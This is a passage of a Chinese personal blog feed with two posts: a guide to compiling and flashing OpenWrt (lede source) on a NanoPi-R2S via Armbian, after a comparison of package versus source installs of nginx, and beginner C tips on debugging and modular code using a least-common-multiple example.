        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="为什么要编译安装？"><a href="#为什么要编译安装？" class="headerlink" title="为什么要编译安装？"></a>为什么要编译安装？</h3><p>最近在使用openwrt系统做自己的网盘nas经常出现问题。主要表现在每次断电重启后系统就损坏了，又要重新刷一遍系统，非常麻烦。于是就想着自己动手编译一个比较好的系统。</p><hr><h3 id="Linux的软件安装方式"><a href="#Linux的软件安装方式" class="headerlink" title="Linux的软件安装方式"></a>Linux的软件安装方式</h3><p>一般来说Linux软件的安装方式有两种。</p><p>一种方式是直接下载大神编译好的二进制文件，称为直接安装，常见的安装方法为使用包管理工具:apt、yum、apk等。</p><p>而另一种方式则是直接下载软件的源代码，勇源代码在自己的机器上进行编译，称为编译安装，常见的安装方法为使用编译工具make、cmake等。</p><p>下面我将从安装nginx的例子给大家说明直接安装和编译安装的不同。</p><hr><h4 id="直接安装的优缺点"><a href="#直接安装的优缺点" class="headerlink" title="直接安装的优缺点"></a>直接安装的优缺点</h4><p>这是直接安装nginx的Linux命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> nginx<span class="token comment"># 直接通过apt包管理工具安装nginx</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这种方式的好处是省力，快速，方便。直接一个命令交给包管理工具，然后你就可以去喝咖啡了，完全不用管。而缺点很明显，就是兼容性不够好，因为源代码编译的机器所使用的环境、处理器架构等都是与你本机有差异的。所以有可能软件在使用的过程中出现各种各样的问题，比如，死机、崩溃、速度慢等……</p><hr><h4 id="编译安装的优缺点"><a href="#编译安装的优缺点" class="headerlink" title="编译安装的优缺点"></a>编译安装的优缺点</h4><p>这是编译安装nginx的Linux命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> -p /opt/data/source<span class="token builtin class-name">cd</span> /opt/data/source<span class="token function">wget</span> http://nginx.org/download/nginx-1.17.4.tar.gz<span class="token function">tar</span> zxmf nginx-1.17.4.tar.gz<span class="token comment"># 获得源码并且解压</span>yum -y <span class="token function">install</span> gcc pcre-devel  zlib-devel openssl-devel libxml2-devel <span class="token punctuation">\</span>    libxslt-devel gd-devel GeoIP-devel jemalloc-devel libatomic_ops-devel <span class="token punctuation">\</span>    perl-devel  perl-ExtUtils-Embed<span class="token comment"># 安装需要的依赖工具，一般是一些编译器</span>./configure <span class="token punctuation">\</span>    --with-threads <span class="token punctuation">\</span>    --with-file-aio <span class="token punctuation">\</span>    --with-http_ssl_module <span class="token punctuation">\</span>    --with-http_v2_module <span class="token punctuation">\</span>    --with-http_realip_module <span class="token punctuation">\</span>    --with-http_addition_module <span class="token punctuation">\</span>    --with-http_xslt_module<span class="token operator">=</span>dynamic <span class="token punctuation">\</span>    --with-http_image_filter_module<span class="token operator">=</span>dynamic <span class="token punctuation">\</span>    --with-http_geoip_module<span class="token operator">=</span>dynamic <span class="token punctuation">\</span>    --with-http_sub_module <span class="token punctuation">\</span>    --with-http_dav_module <span class="token punctuation">\</span>    --with-http_flv_module <span class="token punctuation">\</span>    --with-http_mp4_module <span class="token punctuation">\</span>    --with-http_gunzip_module <span class="token punctuation">\</span>    --with-http_gzip_static_module <span class="token punctuation">\</span>    --with-http_auth_request_module <span class="token punctuation">\</span>    --with-http_random_index_module <span class="token punctuation">\</span>    --with-http_secure_link_module <span class="token punctuation">\</span>    --with-http_degradation_module <span class="token punctuation">\</span>    --with-http_slice_module <span class="token punctuation">\</span>    --with-http_stub_status_module <span class="token punctuation">\</span>    --with-stream<span class="token operator">=</span>dynamic <span class="token punctuation">\</span>    --with-stream_ssl_module <span class="token punctuation">\</span>    --with-stream_realip_module <span class="token punctuation">\</span>    --with-stream_geoip_module<span class="token operator">=</span>dynamic <span class="token punctuation">\</span>    --with-stream_ssl_preread_module <span class="token punctuation">\</span>    --with-compat  <span class="token punctuation">\</span>    --with-pcre-jit    <span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span><span class="token comment"># 进行编译，其中前面的--with可以指定需要的功能模块。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显然这么长串的命令对于新手来说确实不太友好。而且中间出现的各种错误也是成为一系列的绊脚石，成了劝退很多人的大坑。但是既然这么费劲，肯定有他的好处。好处就是，编译安装做出来的软件兼容性非常好！你可以理解为，根据你机器进行量身订做了一个软件！</p><hr><h2 id="Openwrt是什么？"><a href="#Openwrt是什么？" class="headerlink" title="Openwrt是什么？"></a>Openwrt是什么？</h2><p>这部分的内容建议自己百度，因为这边过于冗长，就不展示了。简单来说Openwrt也是一个嵌入式的Linux系统，主要安装在路由器中，用于管理网络，服务器搭建网盘等服务。</p><hr><h2 id="开始编译系统"><a href="#开始编译系统" class="headerlink" title="开始编译系统"></a>开始编译系统</h2><h3 id="进行编译前的准备"><a href="#进行编译前的准备" class="headerlink" title="进行编译前的准备"></a>进行编译前的准备</h3><h4 id="设备说明"><a href="#设备说明" class="headerlink" title="设备说明"></a>设备说明</h4><p>开发板：NanoPi-R2S、存储卡8G以上、读卡器、能上网的电脑</p><hr><h4 id="编译前的准备"><a href="#编译前的准备" class="headerlink" title="编译前的准备"></a>编译前的准备</h4><p>1.下载系统。</p><p>我们到Armbian去下载系统。<br>进入Armbian网站的NanoPi_R2S主页：<a href="https://www.armbian.com/nanopi-r2s/">https://www.armbian.com/nanopi-r2s/</a></p><img src="/2022/11/17/%E8%87%AA%E5%B7%B1%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85openwrt%E7%B3%BB%E7%BB%9F/uTools_1668654353910.png" class="lazyload placeholder" data-srcset="/2022/11/17/%E8%87%AA%E5%B7%B1%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85openwrt%E7%B3%BB%E7%BB%9F/uTools_1668654353910.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="Armbian_1"><p>我们下载jammy，所谓jammy就是Ubuntu的最新版发行代号。</p><img src="/2022/11/17/%E8%87%AA%E5%B7%B1%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85openwrt%E7%B3%BB%E7%BB%9F/uTools_1668654539223.png" class="lazyload placeholder" data-srcset="/2022/11/17/%E8%87%AA%E5%B7%B1%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85openwrt%E7%B3%BB%E7%BB%9F/uTools_1668654539223.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="Armbian_2"><p>直接戳<code>Direct download</code>进行下载。然后对下载的镜像进行解压。</p><p>2.刷写系统。</p><p>在电脑上安装balenaEtcher并且打开，通过读卡器连接储存卡到电脑，然后选择<code>flash from file</code>，选择我们刚刚解压的镜像，选择我们存储下的盘，点击<code>Flash!</code>然后等待就行了。</p><img src="/2022/11/17/%E8%87%AA%E5%B7%B1%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85openwrt%E7%B3%BB%E7%BB%9F/uTools_1668654810671.png" class="lazyload placeholder" data-srcset="/2022/11/17/%E8%87%AA%E5%B7%B1%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85openwrt%E7%B3%BB%E7%BB%9F/uTools_1668654810671.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="Flash"><p>3.启动系统。</p><p>把刚刚刷好的系统放进我们的开发板，开发板wan口连接好路由器的lan口，启动。</p><p>当WAN口灯亮起时，我们到路由器主页查看NanoPi-R2S的ip地址，确保电脑和开发板连接同一个路由器。</p><img src="/2022/11/17/%E8%87%AA%E5%B7%B1%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85openwrt%E7%B3%BB%E7%BB%9F/uTools_1668655271205.png" class="lazyload placeholder" data-srcset="/2022/11/17/%E8%87%AA%E5%B7%B1%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85openwrt%E7%B3%BB%E7%BB%9F/uTools_1668655271205.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="ssh1"><p>然后使用ssh连接到开发板，默认用户名密码为<code>root</code>、<code>1234</code>。</p><img src="/2022/11/17/%E8%87%AA%E5%B7%B1%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85openwrt%E7%B3%BB%E7%BB%9F/uTools_1668655165560.png" class="lazyload placeholder" data-srcset="/2022/11/17/%E8%87%AA%E5%B7%B1%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85openwrt%E7%B3%BB%E7%BB%9F/uTools_1668655165560.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="ssh2"><p>4.配置系统。</p><p>登录系统后我们先更改root的密码，这边建议复杂一点。接着设置时区Asia/Shanghai，语言默认</p><p>然后我们更新系统</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> update<span class="token function">apt-get</span> dist-upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2022/11/17/%E8%87%AA%E5%B7%B1%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85openwrt%E7%B3%BB%E7%BB%9F/uTools_1668657590991.png" class="lazyload placeholder" data-srcset="/2022/11/17/%E8%87%AA%E5%B7%B1%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85openwrt%E7%B3%BB%E7%BB%9F/uTools_1668657590991.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="更新系统"><p>经过漫长的等待。系统更新完成。</p><p>接着我们下载依赖包</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> -y ack antlr3 aria2 asciidoc autoconf automake autopoint binutils bison build-essential <span class="token punctuation">\</span><span class="token function">bzip2</span> ccache cmake cpio <span class="token function">curl</span> device-tree-compiler fastjar flex <span class="token function">gawk</span> gettext gcc-multilib g++-multilib <span class="token punctuation">\</span><span class="token function">git</span> gperf haveged help2man intltool libc6-dev-i386 libelf-dev libglib2.0-dev libgmp3-dev libltdl-dev <span class="token punctuation">\</span>libmpc-dev libmpfr-dev libncurses5-dev libncursesw5-dev libreadline-dev libssl-dev libtool lrzsz <span class="token punctuation">\</span><span class="token function">mkisofs</span> msmtp <span class="token function">nano</span> ninja-build p7zip p7zip-full patch pkgconf python2.7 python3 python3-pip libpython3-dev qemu-utils <span class="token punctuation">\</span><span class="token function">rsync</span> scons squashfs-tools subversion swig texinfo uglifyjs upx-ucl <span class="token function">unzip</span> <span class="token function">vim</span> <span class="token function">wget</span> xmlto xxd zlib1g-dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我们就能够下载源代码并且进行编译的过程了，这里我们使用lean的源码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/coolsnowwolf/lede<span class="token builtin class-name">cd</span> lede./scripts/feeds update -a./scripts/feeds <span class="token function">install</span> -a<span class="token function">make</span> menuconfig<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们接着可以看见图形界面了，在这里可以自己选择需要的插件</p><img src="/2022/11/17/%E8%87%AA%E5%B7%B1%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85openwrt%E7%B3%BB%E7%BB%9F/uTools_1668674987741.png" class="lazyload placeholder" data-srcset="/2022/11/17/%E8%87%AA%E5%B7%B1%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85openwrt%E7%B3%BB%E7%BB%9F/uTools_1668674987741.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="Make"><p>接着我们使用<code>Save</code>保存，然后输入以下的命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> download -j8<span class="token comment"># j后面跟着的是线程数量。</span><span class="token function">make</span> <span class="token assign-left variable">V</span><span class="token operator">=</span>s -j1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后就是漫长的等待环节。当编译完成之后，我们就可以在bin/targets这个目录底下找到编译完成之后的固件了。那么使用同样的方法进行刷写，然后启动就大功告成了！</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>给学C语言的同学的一点建议</title>
      <link href="/2022/11/12/%E5%AD%A6%E4%BC%9AC%E8%AF%AD%E8%A8%80%E7%9A%84%E6%A8%A1%E5%9D%97%E5%8C%96%E7%BC%96%E7%A8%8B/"/>
      <url>/2022/11/12/%E5%AD%A6%E4%BC%9AC%E8%AF%AD%E8%A8%80%E7%9A%84%E6%A8%A1%E5%9D%97%E5%8C%96%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p><img src="https://bingapi.littlewith.tk/" class="lazyload placeholder" data-srcset="https://bingapi.littlewith.tk/" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="给初学C语言的同学的一些Tips"><a href="#给初学C语言的同学的一些Tips" class="headerlink" title="给初学C语言的同学的一些Tips"></a>给初学C语言的同学的一些Tips</h2><p>我在学习编程的时候，我的老师曾跟我说的一些建议，现在我把它们分享给你们。其中有我自己对编程的理解。</p><h3 id="切忌死记硬背"><a href="#切忌死记硬背" class="headerlink" title="切忌死记硬背"></a>切忌死记硬背</h3><p>1.不要去死记硬背代码。很多同学会陷入背诵代码的误区，尝试去背诵一些代码，而我很不赞成这种做法。正确的做法是多练习，做好电子笔记！切记，一定要电子笔记，方便搜索，快速找到知识点。当你平时在使用C语言的时候如果忘记了某些东西你就去翻看笔记，然后回忆起相关的知识点。</p><h3 id="秀出自己的个性"><a href="#秀出自己的个性" class="headerlink" title="秀出自己的个性"></a>秀出自己的个性</h3><p>2.形成自己的代码风格。C语言是很灵活的，光是main函数就有很多种写法，因此各位同学们一定要找到适合自己的代码风格，比如我习惯于这么写:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span><span class="token number">20</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"I love C!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>我总是把花括号的左半边写在前一行。并且我不喜欢省略它。</p><h3 id="多多演练"><a href="#多多演练" class="headerlink" title="多多演练"></a>多多演练</h3><p>3.多使用调试工具。调试(Debugger)是一种很好的发现错误的方法。一般来说，编译失败的时候，编译器只会检查你的语法错误(syntax Error)，因此这就是为什么你的代码明明编译成功却无法输出，那是因为你的程序有运行时错误(Runtime Error)。一般这种错误特别隐晦，你很难发现。比如这个例子:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span>  a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> e<span class="token punctuation">,</span>n<span class="token punctuation">;</span><span class="token function">scanf_s</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">scanf_s</span><span class="token punctuation">(</span><span class="token string">"%d%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>a<span class="token punctuation">,</span> <span class="token operator">&amp;</span>b<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">&gt;</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>e <span class="token operator">=</span> a <span class="token operator">*</span> b<span class="token punctuation">;</span>                    <span class="token comment">//利用a和b的最大公约数乘以最小公倍数等于a*b，先利用辗转相除法计算a,b的最大公约数，由此间接求出a,b的最小公倍数</span><span class="token keyword">do</span><span class="token punctuation">{</span>c <span class="token operator">=</span> a <span class="token operator">%</span> b<span class="token punctuation">;</span>a <span class="token operator">=</span> b<span class="token punctuation">;</span>b <span class="token operator">=</span> c<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>d <span class="token operator">=</span> e <span class="token operator">/</span> b<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>e <span class="token operator">=</span> a <span class="token operator">*</span> b<span class="token punctuation">;</span><span class="token keyword">do</span><span class="token punctuation">{</span>c <span class="token operator">=</span> b <span class="token operator">%</span> a<span class="token punctuation">;</span>b <span class="token operator">=</span> a<span class="token punctuation">;</span>a <span class="token operator">=</span> c<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>d <span class="token operator">=</span> e <span class="token operator">/</span> a<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上文中这是求最小公倍数的代码，乍一看没啥问题，编译也没有任何问题，但是运行却出错误了，原因是这一句:</p><p><code>d = e / a;</code></p><p>当输入2 4的时候，a刚好取到0，而0是不能作除数的。因此会出现错误。</p><p>而如果你会debugger，你可以在main函数中打一个断点(STOP)，然后单步执行(step in)，这时候想Visual Studio 2022这些集成开发环境(IDE)，就能很友善地提醒你：“嘿伙计，这里错了哈！”。比如下图：</p><img src="/2022/11/12/%E5%AD%A6%E4%BC%9AC%E8%AF%AD%E8%A8%80%E7%9A%84%E6%A8%A1%E5%9D%97%E5%8C%96%E7%BC%96%E7%A8%8B/001.png" class="lazyload placeholder" data-srcset="/2022/11/12/%E5%AD%A6%E4%BC%9AC%E8%AF%AD%E8%A8%80%E7%9A%84%E6%A8%A1%E5%9D%97%E5%8C%96%E7%BC%96%E7%A8%8B/001.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="Debugger"><h3 id="把代码拆成零件"><a href="#把代码拆成零件" class="headerlink" title="把代码拆成零件"></a>把代码拆成零件</h3><p>4.尽量让自己代码模块化。模块化能让自己的代码变得更加有逻辑，如果出错排查也会更加容易。C语言的模块化是用函数来实现的。还是拿上面的代码进行举例。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span>  a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> e<span class="token punctuation">,</span>n<span class="token punctuation">;</span><span class="token function">scanf_s</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">scanf_s</span><span class="token punctuation">(</span><span class="token string">"%d%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>a<span class="token punctuation">,</span> <span class="token operator">&amp;</span>b<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">&gt;</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>e <span class="token operator">=</span> a <span class="token operator">*</span> b<span class="token punctuation">;</span>                    <span class="token comment">//利用a和b的最大公约数乘以最小公倍数等于a*b，先利用辗转相除法计算a,b的最大公约数，由此间接求出a,b的最小公倍数</span><span class="token keyword">do</span><span class="token punctuation">{</span>c <span class="token operator">=</span> a <span class="token operator">%</span> b<span class="token punctuation">;</span>a <span class="token operator">=</span> b<span class="token punctuation">;</span>b <span class="token operator">=</span> c<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>d <span class="token operator">=</span> e <span class="token operator">/</span> b<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>e <span class="token operator">=</span> a <span class="token operator">*</span> b<span class="token punctuation">;</span><span class="token keyword">do</span><span class="token punctuation">{</span>c <span class="token operator">=</span> b <span class="token operator">%</span> a<span class="token punctuation">;</span>b <span class="token operator">=</span> a<span class="token punctuation">;</span>a <span class="token operator">=</span> c<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>d <span class="token operator">=</span> e <span class="token operator">/</span> a<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的代码是用来求最小公倍数的，使用的方法是辗转相除法，显然代码有些小问题。</p><blockquote><p>1.代码虽然对a b的大小进行分类，但是都写在main函数中，显得代码非常冗长，可读性差，不美观。</p></blockquote><blockquote><p>2.两种情况下，对变量进行处理的时候，如果出错，那么需要同时修改个地方，易造成Bug。</p></blockquote><blockquote><p>3.定义了很多变量，而且没有给变量进行标记和恰当的命名，容易导致混乱。</p></blockquote><p>那么这种情况就需要用”模块化”的思想来实现。</p><p>这边建议的做法是使用函数(Change)来判断大小并且叫交换变量的值。随后交给函数(Calc)进行求最小公倍数。这时候在main函数中只需要调用这两个函数就行了。修改后的代码如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">void</span> <span class="token function">Change</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">*</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//用指针，确保能完全交换</span><span class="token keyword">int</span> tmp<span class="token punctuation">;</span><span class="token comment">//tmp用于暂存x变量的值</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>x <span class="token operator">&lt;</span> <span class="token operator">*</span>y<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//如果x比y大，那么就进行交换</span>tmp <span class="token operator">=</span> <span class="token operator">*</span>x<span class="token punctuation">;</span><span class="token operator">*</span>x <span class="token operator">=</span> <span class="token operator">*</span>y<span class="token punctuation">;</span><span class="token operator">*</span>y <span class="token operator">=</span> tmp<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">Calc</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">int</span> res<span class="token punctuation">;</span><span class="token keyword">int</span> tmp<span class="token punctuation">;</span><span class="token keyword">int</span> x <span class="token operator">=</span> a<span class="token punctuation">;</span> <span class="token keyword">int</span> y <span class="token operator">=</span> b<span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token comment">//余数不为0，继续相除，直到余数为0</span><span class="token punctuation">{</span> tmp <span class="token operator">=</span> a <span class="token operator">%</span> b<span class="token punctuation">;</span>  a <span class="token operator">=</span> b<span class="token punctuation">;</span>   b <span class="token operator">=</span> tmp<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>tmp <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>res <span class="token operator">=</span> x <span class="token operator">*</span> y <span class="token operator">/</span> a<span class="token punctuation">;</span><span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token comment">//返回计算结果</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//main函数也可用void来定义哦！</span><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token comment">//用来存要输入的组数</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> b<span class="token punctuation">;</span><span class="token comment">//用来存要求的变量</span><span class="token keyword">int</span> result<span class="token punctuation">;</span><span class="token comment">//用来存结果</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请你输入要输入的组数:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>a<span class="token punctuation">,</span> <span class="token operator">&amp;</span>b<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token function">Change</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>a<span class="token punctuation">,</span> <span class="token operator">&amp;</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>result <span class="token operator">=</span> <span class="token function">Calc</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"结果是: %d\n"</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们发现更改后的代码会精简不少，使用的变量名字也进行了命名。并且使用模块化函数对其进行处理，让其更加易读。如果某个模块出现了错误，我们只需要更改这个模块就行了。</p><p>代码的运行结果如下：</p><img src="/2022/11/12/%E5%AD%A6%E4%BC%9AC%E8%AF%AD%E8%A8%80%E7%9A%84%E6%A8%A1%E5%9D%97%E5%8C%96%E7%BC%96%E7%A8%8B/002.png" class="lazyload placeholder" data-srcset="/2022/11/12/%E5%AD%A6%E4%BC%9AC%E8%AF%AD%E8%A8%80%E7%9A%84%E6%A8%A1%E5%9D%97%E5%8C%96%E7%BC%96%E7%A8%8B/002.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" 